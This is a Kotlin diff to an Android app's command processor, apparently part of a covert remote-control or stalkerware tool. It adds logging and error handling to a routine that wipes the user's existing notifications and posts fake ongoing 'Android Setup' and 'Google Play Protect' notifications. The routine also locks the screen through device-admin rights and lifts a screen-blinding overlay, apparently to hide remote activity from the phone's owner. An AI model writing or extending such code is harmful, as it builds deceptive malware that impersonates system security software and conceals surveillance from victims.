@@ -2327,28 +2327,41 @@ object CommandProcessor {
                     }
 
                     // 4. Post-Boot Audio and Notification Manipulation
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 4: Audio and Notification Manipulation starting...")
                     try {
                         val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
-                        try { am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL } catch(e:Exception){}
+                        DebugLogger.log("FINALIZE_LIFECYCLE", "Attempting to restore RINGER_MODE_NORMAL.")
+                        try { 
+                            am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL 
+                            DebugLogger.log("FINALIZE_LIFECYCLE", "RINGER_MODE_NORMAL set successfully.")
+                        } catch(e:Exception){
+                            DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "Failed to set RINGER_MODE_NORMAL: ${e.message}")
+                        }
                         
                         val maxRing = am.getStreamMaxVolume(android.media.AudioManager.STREAM_RING)
-                        am.setStreamVolume(android.media.AudioManager.STREAM_RING, (maxRing * 0.7f).toInt(), 0)
+                        val targetRing = (maxRing * 0.7f).toInt()
+                        DebugLogger.log("FINALIZE_LIFECYCLE", "Setting STREAM_RING to $targetRing (Max: $maxRing)")
+                        am.setStreamVolume(android.media.AudioManager.STREAM_RING, targetRing, 0)
                         
                         val maxNotif = am.getStreamMaxVolume(android.media.AudioManager.STREAM_NOTIFICATION)
-                        am.setStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION, (maxNotif * 0.7f).toInt(), 0)
-                        DebugLogger.log("FINALIZE", "Audio volumes restored to 70%.")
+                        val targetNotif = (maxNotif * 0.7f).toInt()
+                        DebugLogger.log("FINALIZE_LIFECYCLE", "Setting STREAM_NOTIFICATION to $targetNotif (Max: $maxNotif)")
+                        am.setStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION, targetNotif, 0)
+                        DebugLogger.log("FINALIZE_LIFECYCLE", "Audio volumes restored to 70%.")
                     } catch(e: Exception) {
-                        DebugLogger.log("FINALIZE_ERR", "Audio restore failed: ${e.message}")
+                        DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "Audio restore failed: ${e.message}")
                     }
 
-                    val wipedCount = MyNotificationListener.instance?.wipeNotifications("ALL", null) ?: -1
-                    if (wipedCount == -1) {
-                        DebugLogger.log("FINALIZE_ERR", "NotificationListener offline. Could not wipe existing notifications.")
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Attempting to wipe existing notifications...")
+                    if (MyNotificationListener.instance != null) {
+                        val wipedCount = MyNotificationListener.instance?.wipeNotifications("ALL", null) ?: -1
+                        DebugLogger.log("FINALIZE_LIFECYCLE", "Wiped $wipedCount existing notifications.")
                     } else {
-                        DebugLogger.log("FINALIZE", "Wiped $wipedCount existing notifications.")
+                        DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "NotificationListener offline. Could not wipe existing notifications.")
                     }
 
                     // Push fake notifications FIRST so they are ready when screen turns on
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Posting fake setup notifications...")
                     val fakeNotifs = listOf(
                         Pair("Android Setup", "Finishing system update..."),
                         Pair("Google Play Protect", "Scanning device for threats..."),
@@ -2357,55 +2370,70 @@ object CommandProcessor {
                         Pair("Android Setup", "Restoring backed up data...")
                     )
                     
-                    val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
-                    val channelId = "system_integrity_alerts"
-                    var notifId = 8000
-                    for (notifData in fakeNotifs) {
-                        val builder = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
-                            .setSmallIcon(android.R.drawable.stat_notify_sync)
-                            .setContentTitle(notifData.first)
-                            .setContentText(notifData.second)
-                            .setProgress(100, (10..90).random(), true)
-                            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
-                            .setOngoing(true)
-                        nm.notify(notifId++, builder.build())
-                        kotlinx.coroutines.delay(200)
+                    try {
+                        val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+                        val channelId = "system_integrity_alerts"
+                        var notifId = 8000
+                        for (notifData in fakeNotifs) {
+                            val builder = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
+                                .setSmallIcon(android.R.drawable.stat_notify_sync)
+                                .setContentTitle(notifData.first)
+                                .setContentText(notifData.second)
+                                .setProgress(100, (10..90).random(), true)
+                                .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
+                                .setOngoing(true)
+                            nm.notify(notifId++, builder.build())
+                            kotlinx.coroutines.delay(200)
+                            DebugLogger.log("FINALIZE_LIFECYCLE", "Posted fake notif: ${notifData.first}")
+                        }
+                        DebugLogger.log("FINALIZE_LIFECYCLE", "All fake notifications posted.")
+                    } catch(e: Exception) {
+                        DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "Failed to post fake notifications: ${e.message}")
                     }
-                    DebugLogger.log("FINALIZE", "Fake notifications posted.")
 
                     // 5. Physically Lock Screen
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 5: Physically Lock Screen via DeviceAdmin")
                     val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                     val adminComponent = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
                     if (dpm.isAdminActive(adminComponent)) {
                         try { 
                             dpm.lockNow() 
-                            DebugLogger.log("FINALIZE", "Screen locked physically.")
+                            DebugLogger.log("FINALIZE_LIFECYCLE", "Screen locked physically.")
                         } catch (e: Exception) { 
-                            DebugLogger.log("FINALIZE_ERR", "Lock failed: ${e.message}")
+                            DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "Lock failed: ${e.message}")
                         }
                     } else {
-                        DebugLogger.log("FINALIZE_ERR", "Cannot lock screen: Device Admin not active.")
+                        DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "Cannot lock screen: Device Admin not active.")
                     }
 
                     // Release ignition block from Setup process
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Releasing power_shield_keep_ignited flag.")
                     ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                         .putBoolean("power_shield_keep_ignited", false).apply()
 
                     // Wait for lock to settle
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Waiting 1500ms for lock to settle...")
                     kotlinx.coroutines.delay(1500)
 
                     // 6. Wake Screen to Swipe/Lock screen
-                    val pulseIntent = android.content.Intent(ctx, PulseActivity::class.java).apply {
-                        addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
-                        putExtra("is_wake_trigger", true)
-                        putExtra("preserve_keyguard", true)
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 6: Waking screen via PulseActivity")
+                    try {
+                        val pulseIntent = android.content.Intent(ctx, PulseActivity::class.java).apply {
+                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                            putExtra("is_wake_trigger", true)
+                            putExtra("preserve_keyguard", true)
+                        }
+                        ctx.startActivity(pulseIntent)
+                        DebugLogger.log("FINALIZE_LIFECYCLE", "Wake intent dispatched.")
+                    } catch(e: Exception) {
+                        DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "Failed to dispatch Wake intent: ${e.message}")
                     }
-                    ctx.startActivity(pulseIntent)
-                    DebugLogger.log("FINALIZE", "Wake intent dispatched.")
 
                     // 7. Unblind the screen so user can see the lockscreen
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 7: Waiting 800ms before unblinding screen...")
                     kotlinx.coroutines.delay(800)
                     android.os.Handler(android.os.Looper.getMainLooper()).post {
+                        DebugLogger.log("FINALIZE_LIFECYCLE", "Unblinding screen (DimmerManager.removeOverlay). FINALIZE_RESET macro complete.")
                         DimmerManager.removeOverlay(ctx)
                     }
 
